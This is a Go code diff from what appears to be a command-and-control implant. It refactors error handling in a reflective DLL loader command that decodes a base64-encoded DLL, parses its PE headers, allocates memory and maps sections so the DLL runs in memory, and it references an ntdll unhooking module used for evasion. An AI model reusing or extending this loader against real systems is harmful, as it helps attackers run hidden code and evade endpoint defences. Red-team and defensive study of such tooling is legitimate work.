@@ -128,42 +128,22 @@ var (
 func (c *ReflectiveLoadCommand) Execute(task structs.Task) structs.CommandResult {
 	var args reflectiveLoadArgs
 	if task.Params == "" {
-		return structs.CommandResult{
-			Output:    "Error: dll_b64 parameter required (base64-encoded PE/DLL)",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: dll_b64 parameter required (base64-encoded PE/DLL)")
 	}
 	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error parsing parameters: %v", err)
 	}
 	if args.DllB64 == "" {
-		return structs.CommandResult{
-			Output:    "Error: dll_b64 is empty",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: dll_b64 is empty")
 	}
 
 	dllBytes, err := base64.StdEncoding.DecodeString(args.DllB64)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error decoding DLL: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error decoding DLL: %v", err)
 	}
 
 	if len(dllBytes) < 64 {
-		return structs.CommandResult{
-			Output:    "Error: PE data too small",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: PE data too small")
 	}
 
 	return reflectiveLoad(dllBytes, args.Function)
@@ -179,39 +159,23 @@ func reflectiveLoad(peData []byte, exportFunc string) structs.CommandResult {
 	// 1. Parse DOS header (reuses imageDOSHeader from ntdll_unhook.go)
 	dosHeader := (*imageDOSHeader)(unsafe.Pointer(&peData[0]))
 	if dosHeader.EMagic != rlDOSSignature {
-		return structs.CommandResult{
-			Output:    "Error: invalid PE — missing MZ signature",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: invalid PE — missing MZ signature")
 	}
 
 	ntOffset := dosHeader.ELfanew
 	if ntOffset < 0 || int(ntOffset)+4 > len(peData) {
-		return structs.CommandResult{
-			Output:    "Error: invalid PE — bad NT header offset",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: invalid PE — bad NT header offset")
 	}
 
 	// 2. Parse NT headers (reuses imageFileHeader from ntdll_unhook.go)
 	ntSig := binary.LittleEndian.Uint32(peData[ntOffset:])
 	if ntSig != rlNTSignature {
-		return structs.CommandResult{
-			Output:    "Error: invalid PE — missing PE signature",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: invalid PE — missing PE signature")
 	}
 
 	fileHeader := (*imageFileHeader)(unsafe.Pointer(&peData[ntOffset+4]))
 	if fileHeader.Machine != rlMachineMD64 {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: only x64 PE supported (machine: 0x%X)", fileHeader.Machine),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: only x64 PE supported (machine: 0x%X)", fileHeader.Machine)
 	}
 
 	optHeaderOffset := ntOffset + 4 + int32(unsafe.Sizeof(imageFileHeader{}))
@@ -232,11 +196,7 @@ func reflectiveLoad(peData []byte, exportFunc string) structs.CommandResult {
 		rlPageReadWrite,
 	)
 	if allocBase == 0 {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: memory allocation failed: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: memory allocation failed: %v", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Allocated at 0x%X (size: %d)\n", allocBase, optHeader.SizeOfImage))
 
@@ -261,11 +221,7 @@ func reflectiveLoad(peData []byte, exportFunc string) structs.CommandResult {
 
 		if sec.SizeOfRawData > 0 {
 			if sec.PointerToRawData+sec.SizeOfRawData > uint32(len(peData)) {
-				return structs.CommandResult{
-					Output:    fmt.Sprintf("Error: section %s extends beyond file", rlSectionName(sec.Name)),
-					Status:    "error",
-					Completed: true,
-				}
+				return errorf("Error: section %s extends beyond file", rlSectionName(sec.Name))
 			}
 			dest := allocBase + uintptr(sec.VirtualAddress)
 			src := uintptr(unsafe.Pointer(&peData[sec.PointerToRawData]))
